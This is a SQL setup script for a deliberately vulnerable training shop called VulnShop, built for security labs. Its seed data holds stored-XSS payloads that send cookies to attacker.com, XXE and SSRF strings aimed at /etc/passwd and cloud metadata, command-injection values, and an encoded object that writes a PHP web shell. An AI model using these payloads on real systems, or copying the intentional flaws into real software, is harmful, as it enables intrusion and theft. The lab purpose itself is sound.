-- ============================================================
--  VulnShop - Deliberately Vulnerable E-Commerce Database
--  FOR SECURITY LAB / EDUCATIONAL USE ONLY
--  Updated: includes all new vulnerability tables + rich seed data
-- ============================================================

CREATE DATABASE IF NOT EXISTS vulnshop;
USE vulnshop;

-- ============================================================
--  CORE TABLES
-- ============================================================

-- Users (plain-text passwords, no hashing)
CREATE TABLE IF NOT EXISTS users (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    username     VARCHAR(100) NOT NULL,
    password     VARCHAR(255) NOT NULL,
    email        VARCHAR(255) NOT NULL,
    full_name    VARCHAR(255),
    address      TEXT,
    phone        VARCHAR(30),
    role         VARCHAR(20)  DEFAULT 'user',
    bio          TEXT,
    avatar       VARCHAR(255) DEFAULT 'default.png',
    reset_token  VARCHAR(64)  DEFAULT NULL,
    reset_expiry DATETIME     DEFAULT NULL,
    created_at   DATETIME     DEFAULT CURRENT_TIMESTAMP
);

-- Categories
CREATE TABLE IF NOT EXISTS categories (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    name        VARCHAR(100) NOT NULL,
    description TEXT
);

-- Products
CREATE TABLE IF NOT EXISTS products (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    name        VARCHAR(255) NOT NULL,
    description TEXT,
    price       DECIMAL(10,2) NOT NULL,
    stock       INT           DEFAULT 100,
    category_id INT,
    image       VARCHAR(255)  DEFAULT 'product.png',
    created_at  DATETIME      DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (category_id) REFERENCES categories(id)
);

-- Orders
CREATE TABLE IF NOT EXISTS orders (
    id               INT AUTO_INCREMENT PRIMARY KEY,
    user_id          INT,
    total            DECIMAL(10,2),
    status           VARCHAR(50) DEFAULT 'pending',
    shipping_address TEXT,
    created_at       DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Order Items
CREATE TABLE IF NOT EXISTS order_items (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    order_id   INT,
    product_id INT,
    quantity   INT,
    price      DECIMAL(10,2),
    FOREIGN KEY (order_id)   REFERENCES orders(id),
    FOREIGN KEY (product_id) REFERENCES products(id)
);

-- Cart
CREATE TABLE IF NOT EXISTS cart (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    user_id    INT,
    product_id INT,
    quantity   INT DEFAULT 1,
    FOREIGN KEY (user_id)    REFERENCES users(id),
    FOREIGN KEY (product_id) REFERENCES products(id)
);

-- Reviews (stored XSS vector)
CREATE TABLE IF NOT EXISTS reviews (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    product_id INT,
    user_id    INT,
    rating     INT,
    comment    TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (product_id) REFERENCES products(id),
    FOREIGN KEY (user_id)    REFERENCES users(id)
);

-- Messages / Contact (stored XSS vector)
CREATE TABLE IF NOT EXISTS messages (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    name       VARCHAR(255),
    email      VARCHAR(255),
    subject    VARCHAR(255),
    message    TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Coupons (SQLi target in checkout)
CREATE TABLE IF NOT EXISTS coupons (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    code     VARCHAR(50),
    discount INT,
    active   TINYINT DEFAULT 1
);

-- ============================================================
--  NEW VULNERABILITY TABLES
-- ============================================================

-- XML Import Log (XXE lab — tracks what was imported)
CREATE TABLE IF NOT EXISTS xml_imports (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    raw_xml    TEXT,
    ip_address VARCHAR(45),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- SSRF Request Log (SSRF lab — logs URLs fetched by server)
CREATE TABLE IF NOT EXISTS ssrf_logs (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    url_fetched  TEXT,
    response_code INT,
    ip_address   VARCHAR(45),
    created_at   DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- File Access Log (LFI/download lab — tracks file reads)
CREATE TABLE IF NOT EXISTS file_access_logs (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    file_path   TEXT,
    access_type VARCHAR(20),
    ip_address  VARCHAR(45),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Command Injection Log (cmdi lab — logs commands run)
CREATE TABLE IF NOT EXISTS command_logs (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    tool        VARCHAR(30),
    target      TEXT,
    full_cmd    TEXT,
    ip_address  VARCHAR(45),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Redirect Log (open redirect / CRLF lab)
CREATE TABLE IF NOT EXISTS redirect_logs (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    action      VARCHAR(20),
    url_or_msg  TEXT,
    ip_address  VARCHAR(45),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Wishlist / Deserialization Log
CREATE TABLE IF NOT EXISTS wishlist_logs (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    user_id     INT DEFAULT 0,
    raw_data    TEXT,
    object_class VARCHAR(100),
    ip_address  VARCHAR(45),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Password Reset Log (tracks reset attempts — no rate limit intentionally)
CREATE TABLE IF NOT EXISTS reset_logs (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    username    VARCHAR(100),
    token_used  VARCHAR(64),
    success     TINYINT DEFAULT 0,
    ip_address  VARCHAR(45),
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Uploaded Files (file upload vuln tracker)
CREATE TABLE IF NOT EXISTS uploads (
    id            INT AUTO_INCREMENT PRIMARY KEY,
    user_id       INT DEFAULT 0,
    original_name VARCHAR(255),
    stored_name   VARCHAR(255),
    file_type     VARCHAR(100),
    file_size     INT,
    ip_address    VARCHAR(45),
    created_at    DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- API Keys (for broken object level auth demo)
CREATE TABLE IF NOT EXISTS api_keys (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    user_id    INT,
    api_key    VARCHAR(64),
    label      VARCHAR(100),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Notes (IDOR / access control target)
CREATE TABLE IF NOT EXISTS notes (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    user_id    INT,
    title      VARCHAR(255),
    content    TEXT,
    is_private TINYINT DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- ============================================================
--  SEED DATA
-- ============================================================

-- -------------------------------------------------------
-- Users (10 accounts — mix of admin, staff, customers)
-- Passwords stored in PLAIN TEXT (vulnerability)
-- -------------------------------------------------------
INSERT INTO users (username, password, email, full_name, address, phone, role, bio) VALUES
('admin',     'admin123',      'admin@vulnshop.com',    'Admin User',          '1 Admin Street, Server City',      '555-0001', 'admin', 'Site administrator. DO NOT share credentials.'),
('john',      'password',      'john@example.com',      'John Doe',            '42 Elm Street, Springfield',       '555-0002', 'user',  'Regular shopper. Loves electronics.'),
('alice',     'alice123',      'alice@example.com',     'Alice Smith',         '7 Maple Ave, Shelbyville',         '555-0003', 'user',  'I love online shopping!'),
('bob',       'letmein',       'bob@example.com',       'Bob Johnson',         '99 Oak Rd, Capital City',          '555-0004', 'user',  'Tech enthusiast and book lover.'),
('charlie',   'charlie',       'charlie@example.com',   'Charlie Brown',       '5 Peanuts Lane, Goodgrief',        '555-0005', 'user',  'Just browsing around.'),
('dave',      'dave2024',      'dave@example.com',      'Dave Miller',         '12 Sunset Blvd, Los Angeles',      '555-0006', 'user',  'Photographer and gadget collector.'),
('eve',       'evepass',       'eve@example.com',       'Eve Wilson',          '88 Hacker Way, San Francisco',     '555-0007', 'user',  'Security researcher (ethical).'),
('frank',     'fr@nk!',        'frank@example.com',     'Frank Castle',        '666 Punisher Ave, New York',       '555-0008', 'user',  'Fitness junkie and sports fan.'),
('grace',     'gracepass',     'grace@example.com',     'Grace Lee',           '3 Cherry Blossom Rd, Portland',    '555-0009', 'user',  'Book worm and tea drinker.'),
('staff1',    'staffpass',     'staff@vulnshop.com',    'Support Staff',       '1 Admin Street, Server City',      '555-0010', 'admin', 'Customer support role.');

-- -------------------------------------------------------
-- Categories (6 categories)
-- -------------------------------------------------------
INSERT INTO categories (name, description) VALUES
('Electronics',    'Gadgets, devices and tech accessories'),
('Clothing',       'Apparel and fashion items'),
('Books',          'Physical and digital books'),
('Home & Garden',  'Everything for your home and garden'),
('Sports',         'Sports equipment, gear and activewear'),
('Security Tools', 'Books, courses, and tools for security professionals');

-- -------------------------------------------------------
-- Products (20 products across all categories)
-- -------------------------------------------------------
INSERT INTO products (name, description, price, stock, category_id, image) VALUES
('Laptop Pro X',            'High-performance laptop, 16GB RAM, 512GB SSD, Intel i7. Perfect for work and gaming.',              999.99,  50, 1, 'laptop.jpg'),
('Wireless Headphones',     'Premium noise-cancelling headphones with 30hr battery life and crystal clear audio.',               149.99,  80, 1, 'headphones.jpg'),
('Smartphone Ultra',        'Flagship phone: 6.7" AMOLED, 108MP camera, 5G, 256GB storage.',                                    799.99,  30, 1, 'phone.jpg'),
('USB-C Hub 7-in-1',        'Expand your laptop with 4K HDMI, USB 3.0x3, SD card reader, 100W PD.',                              39.99, 120, 1, 'hub.jpg'),
('Mechanical Keyboard',     'TKL mechanical keyboard, Cherry MX Blue, RGB backlight, USB-C.',                                    79.99,  65, 1, 'keyboard.jpg'),
('Gaming Mouse',            'High-precision 16000 DPI gaming mouse, 7 programmable buttons, RGB.',                               49.99,  85, 1, 'mouse.jpg'),
('Portable Charger 20000',  '20000mAh power bank, dual USB-A and USB-C, fast charge, compact design.',                           29.99, 140, 1, 'charger.jpg'),
('Webcam 4K Pro',           '4K 60fps webcam with built-in ring light and noise-cancelling mic. Plug-and-play.',                  89.99,  55, 1, 'webcam.jpg'),
('Classic T-Shirt',         'Comfortable 100% cotton unisex t-shirt, multiple colours, S-3XL.',                                  19.99, 200, 2, 'tshirt.jpg'),
('Running Shoes',           'Lightweight breathable running shoes with memory foam insole. Sizes 6-13.',                          89.99,  75, 2, 'shoes.jpg'),
('Denim Jacket',            'Classic blue denim jacket, slim fit, all seasons.',                                                  59.99,  60, 2, 'jacket.jpg'),
('Compression Leggings',    'High-waist sports leggings with four-way stretch fabric. Squat-proof.',                              34.99,  90, 2, 'leggings.jpg'),
('Python Programming',      'Learn Python from scratch. Web dev, data science, automation. 500+ pages.',                          34.99, 150, 3, 'book1.jpg'),
('Hacking: The Art',        'Ethical hacking, penetration testing, and security research. Complete guide.',                       44.99,  90, 3, 'book2.jpg'),
('Web Security Bible',      'Deep dive into OWASP Top 10, XSS, SQLi, CSRF, and modern web vulns.',                               39.99, 100, 3, 'book3.jpg'),
('Smart Coffee Maker',      'WiFi-enabled 12-cup coffee maker with app control and programmable timer.',                          79.99,  40, 4, 'coffee.jpg'),
('Yoga Mat Premium',        'Non-slip 6mm thick eco-friendly yoga mat with carry strap.',                                         29.99, 110, 5, 'yoga.jpg'),
('Burp Suite Pro Course',   'Video course: mastering Burp Suite for web app pentesting. 20+ hours.',                              99.99,  999, 6, 'burp.jpg'),
('CTF Beginner Bundle',     'Capture the Flag starter kit: book + cheat sheets + VM image download.',                             49.99,  999, 6, 'ctf.jpg'),
('Rubber Ducky USB',        'Programmable USB keystroke injection device for security testing.',                                   49.99,   25, 6, 'ducky.jpg');

-- -------------------------------------------------------
-- Coupons
-- -------------------------------------------------------
INSERT INTO coupons (code, discount, active) VALUES
('SAVE10',     10, 1),
('WELCOME20',  20, 1),
('HACK50',     50, 1),
('VULN100',   100, 1),
('EXPIRED5',    5, 0),
('STAFF30',    30, 1);

-- -------------------------------------------------------
-- Orders (7 sample orders across users)
-- -------------------------------------------------------
INSERT INTO orders (user_id, total, status, shipping_address, created_at) VALUES
(2, 1149.98, 'delivered',  '42 Elm Street, Springfield',       '2026-09-01 10:15:00'),
(3,  179.98, 'shipped',    '7 Maple Ave, Shelbyville',         '2026-09-05 14:30:00'),
(4,  839.98, 'delivered',  '99 Oak Rd, Capital City',          '2026-09-10 09:00:00'),
(2,   84.98, 'pending',    '42 Elm Street, Springfield',       '2026-10-01 11:45:00'),
(5,   44.99, 'processing', '5 Peanuts Lane, Goodgrief',        '2026-10-05 16:20:00'),
(6,  199.98, 'delivered',  '12 Sunset Blvd, Los Angeles',      '2026-10-10 08:00:00'),
(7,   99.99, 'shipped',    '88 Hacker Way, San Francisco',     '2026-10-15 12:00:00');

-- -------------------------------------------------------
-- Order Items (linked to orders above)
-- -------------------------------------------------------
INSERT INTO order_items (order_id, product_id, quantity, price) VALUES
-- Order 1: john — Laptop + Headphones
(1, 1, 1, 999.99),
(1, 2, 1, 149.99),
-- Order 2: alice — Headphones + T-Shirt
(2, 2, 1, 149.99),
(2, 9, 2,  19.99),
-- Order 3: bob — Phone + USB Hub
(3, 3, 1, 799.99),
(3, 4, 1,  39.99),
-- Order 4: john — Keyboard + Mouse
(4, 5, 1,  79.99),
(4, 6, 1,  49.99),
-- Order 5: charlie — Hacking book
(5, 14, 1, 44.99),
-- Order 6: dave — Webcam + Charger
(6, 8, 1,  89.99),
(6, 7, 1,  29.99),
(6, 5, 1,  79.99),
-- Order 7: eve — Burp Suite Course
(7, 18, 1, 99.99);

-- -------------------------------------------------------
-- Cart (some users have items in cart right now)
-- -------------------------------------------------------
INSERT INTO cart (user_id, product_id, quantity) VALUES
(2,  1, 1),
(2, 17, 1),
(3, 13, 2),
(4,  5, 1),
(4, 18, 1),
(5, 14, 1);

-- -------------------------------------------------------
-- Reviews (normal + stored XSS payloads)
-- -------------------------------------------------------
INSERT INTO reviews (product_id, user_id, rating, comment) VALUES
-- Legit reviews
(1,  2, 5, 'Amazing laptop! Best purchase I have made this year.'),
(1,  3, 4, 'Great performance, battery life could be better.'),
(2,  2, 5, 'Noise cancelling is absolutely top notch!'),
(3,  4, 4, 'Love the camera quality. Fast 5G connection too.'),
(5,  6, 5, 'Clicky keys are satisfying. Build quality is excellent.'),
(6,  4, 4, 'Tracks perfectly on any surface. Love the extra buttons.'),
(13, 3, 5, 'Great Python book for beginners. Very practical examples.'),
(14, 4, 5, 'Must-read for any security professional.'),
(15, 7, 5, 'Extremely thorough. Covers every OWASP category in depth.'),
(18, 7, 5, 'Best Burp Suite course out there. Learned a ton!'),
-- Stored XSS payloads (unsanitised comment field)
(1,  5, 1, '<script>alert("XSS in Review")</script>'),
(2,  5, 1, '<img src=x onerror="document.location=''http://attacker.com/steal?c=''+document.cookie">'),
(3,  4, 3, '<svg onload="alert(document.domain)">'),
(13, 3, 2, '<script>fetch("http://attacker.com/?k="+document.cookie)</script>'),
(15, 2, 1, '"><script>alert(1)</script>');

-- -------------------------------------------------------
-- Messages (normal + stored XSS payloads)
-- -------------------------------------------------------
INSERT INTO messages (name, email, subject, message) VALUES
('John Doe',     'john@example.com',    'Order question',          'Hi, when will my order #1 arrive? Thanks!'),
('Alice Smith',  'alice@example.com',   'Wrong item received',     'I received the wrong size on my T-Shirt order. Please help.'),
('Anonymous',    'hack@evil.com',       'XSS Test',                '<script>alert("Stored XSS in Messages")</script>'),
('Bob Johnson',  'bob@example.com',     'Product feedback',        'The USB hub stopped working after 2 weeks. Disappointed.'),
('Eve Wilson',   'eve@example.com',     'Security concern',        'Your login page is vulnerable to SQL injection. Please fix ASAP.'),
('<img src=x onerror=alert(1)>', 'xss@test.com', 'XSS in name', 'Testing stored XSS in name field'),
('Charlie',      'charlie@example.com', 'Discount code broken',    'The coupon HACK50 keeps saying invalid. Can you check?'),
('Dave Miller',  'dave@example.com',    'Delivery issue',          'Package was delivered to the wrong address. Please investigate.');

-- -------------------------------------------------------
-- Notes (IDOR / broken access control target)
-- -------------------------------------------------------
INSERT INTO notes (user_id, title, content, is_private) VALUES
(1, 'Admin: Server Passwords',    'DB: root/root | FTP: admin/admin123 | SSH: ubuntu/ubuntu2024', 1),
(1, 'Admin: API Keys',            'Stripe secret: sk_live_XXXX... | Twilio: AC123... | AWS: AKIA...', 1),
(2, 'Shopping List',              'Need to buy: keyboard, mouse, monitor stand', 0),
(3, 'Birthday Gift Ideas',        'Thinking about Laptop Pro X or Wireless Headphones for mum', 1),
(4, 'Tech Notes',                 'Remember: Python 3.12 released, check asyncio improvements', 0),
(5, 'Random Thoughts',            'Life is good. Peanuts are tasty.', 0),
(7, 'Vuln Notes',                 'SQLi on search.php: '' OR 1=1-- \nXSS on review comment field confirmed', 1),
(2, 'Credit Card Info',           'Visa: 4111-1111-1111-1111 | Exp: 12/27 | CVV: 123 (test card)', 1),
(1, 'Admin: Staff Accounts',      'staff1 / staffpass | temp_admin / temp123 (DELETE AFTER USE)', 1),
(6, 'Camera Settings',            'Portrait mode: f/1.8, ISO 100, 1/200s. Street: f/8, ISO 400', 0);

-- -------------------------------------------------------
-- API Keys (broken object level auth demo)
-- -------------------------------------------------------
INSERT INTO api_keys (user_id, api_key, label) VALUES
(1, 'sk_admin_a1b2c3d4e5f6789012345678901234ab', 'Admin Master Key'),
(2, 'sk_user_john_deadbeef1234567890abcdef0123', 'John API Access'),
(3, 'sk_user_alice_cafebabe9876543210fedcba0987', 'Alice Mobile App'),
(7, 'sk_user_eve_0f0e0d0c0b0a090807060504030201', 'Eve Security Scanner');

-- -------------------------------------------------------
-- XML Imports Log (pre-populated with sample malicious XML)
-- -------------------------------------------------------
INSERT INTO xml_imports (raw_xml, ip_address, created_at) VALUES
('<?xml version="1.0"?><products><product><name>Normal Widget</name><price>9.99</price><desc>Test</desc><stock>10</stock></product></products>', '127.0.0.1', '2026-10-01 09:00:00'),
('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><products><product><name>&xxe;</name><price>1</price><desc>x</desc><stock>1</stock></product></products>', '192.168.1.50', '2026-10-10 14:22:00'),
('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><products><product><name>&xxe;</name><price>1</price><desc>ssrf</desc><stock>1</stock></product></products>', '10.0.0.5', '2026-10-12 08:11:00');

-- -------------------------------------------------------
-- SSRF Logs (pre-populated to show attack history)
-- -------------------------------------------------------
INSERT INTO ssrf_logs (url_fetched, response_code, ip_address, created_at) VALUES
('http://example.com',                                         200, '127.0.0.1',    '2026-10-01 10:00:00'),
('http://169.254.169.254/latest/meta-data/',                   200, '192.168.1.50', '2026-10-10 15:00:00'),
('file:///etc/passwd',                                           0, '10.0.0.5',     '2026-10-11 09:30:00'),
('http://127.0.0.1:3306/',                                       0, '10.0.0.5',     '2026-10-12 10:05:00'),
('dict://127.0.0.1:6379/info',                                   0, '10.0.0.9',     '2026-10-13 11:00:00');

-- -------------------------------------------------------
-- File Access Logs
-- -------------------------------------------------------
INSERT INTO file_access_logs (file_path, access_type, ip_address, created_at) VALUES
('includes/db.php',                            'read',  '127.0.0.1',    '2026-10-01 08:00:00'),
('../../../etc/passwd',                         'read',  '192.168.1.50', '2026-10-05 14:00:00'),
('../../../windows/win.ini',                    'read',  '10.0.0.5',     '2026-10-06 11:00:00'),
('php://filter/convert.base64-encode/resource=includes/db.php', 'read', '10.0.0.5', '2026-10-08 16:00:00'),
('database.sql',                               'read',  '192.168.1.77', '2026-10-09 09:00:00');

-- -------------------------------------------------------
-- Command Logs
-- -------------------------------------------------------
INSERT INTO command_logs (tool, target, full_cmd, ip_address, created_at) VALUES
('ping',      '127.0.0.1',                 'ping -c 1 127.0.0.1',              '127.0.0.1',    '2026-10-01 09:00:00'),
('ping',      '127.0.0.1 ; whoami',         'ping -c 1 127.0.0.1 ; whoami',     '192.168.1.50', '2026-10-08 13:00:00'),
('nslookup',  '127.0.0.1 && id',            'nslookup 127.0.0.1 && id',          '10.0.0.5',     '2026-10-09 10:00:00'),
('curl',      'http://evil.com; cat /etc/passwd', 'curl -I http://evil.com; cat /etc/passwd', '10.0.0.9', '2026-10-10 15:30:00');

-- -------------------------------------------------------
-- Wishlist / Deserialize Logs
-- -------------------------------------------------------
INSERT INTO wishlist_logs (user_id, raw_data, object_class, ip_address, created_at) VALUES
(2, 'TzoyODoiV2lzaGxpc3QiOjM6e3M6NzoidXNlcl9pZCI7aToxO3M6NToiaXRlbXMiO2E6Mzp7aTowO2k6MTtpOjE7aToyO2k6MjtpOjI7aTozO31zOjU6ImxhYmVsIjtzOjEyOiJNeSBXaXNobGlzdCI7fQ==', 'Wishlist', '127.0.0.1', '2026-10-01 10:00:00'),
(0, 'TzoxMDoiRmlsZVdyaXRlciI6Mjp7czo4OiJmaWxlbmFtZSI7czozODoiL3Zhci93d3cvaHRtbC91cGxvYWRzL3B3bmVkLnBocCI7czo3OiJjb250ZW50IjtzOjQ2OiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO30=', 'FileWriter', '192.168.1.50', '2026-10-10 15:00:00');

-- -------------------------------------------------------
-- Reset Logs
-- -------------------------------------------------------
INSERT INTO reset_logs (username, token_used, success, ip_address, created_at) VALUES
('admin', 'predicted_token_here', 1, '192.168.1.50', '2026-10-11 12:00:00'),
('john',  'wrong_token',          0, '10.0.0.5',     '2026-10-12 08:00:00');
